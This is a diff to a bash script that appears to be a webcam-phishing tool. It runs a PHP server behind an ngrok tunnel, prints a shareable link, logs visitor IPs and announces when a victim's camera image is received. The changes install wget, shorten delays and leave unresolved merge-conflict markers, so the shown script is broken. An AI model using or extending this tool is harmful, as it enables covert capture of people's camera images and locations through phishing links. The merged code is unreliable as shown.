@@ -15,7 +15,14 @@ if [ $(dpkg-query -W -f='${Status}' curl 2>/dev/null | grep -c "ok installed") -
 then
 	apt-get install --force-yes --yes curl;
 fi
+<<<<<<< HEAD
 
+=======
+if [ $(dpkg-query -W -f='${Status}' wget 2>/dev/null | grep -c "ok installed") -eq 0 ];
+then
+	apt-get install --force-yes --yes wget;
+fi
+>>>>>>> 404bd2df345b44d2885fe487dec7d64651d687d4
 banner() {
 
 	printf "$(tput setaf 1)"
@@ -85,13 +92,13 @@ python ipdet.py
 rm -rf ip.txt
 fi
 
-sleep 0.5
+sleep 0.2
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
-sleep 0.5
+sleep 0.2
 
 done
 
@@ -148,7 +155,7 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+sleep 4
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
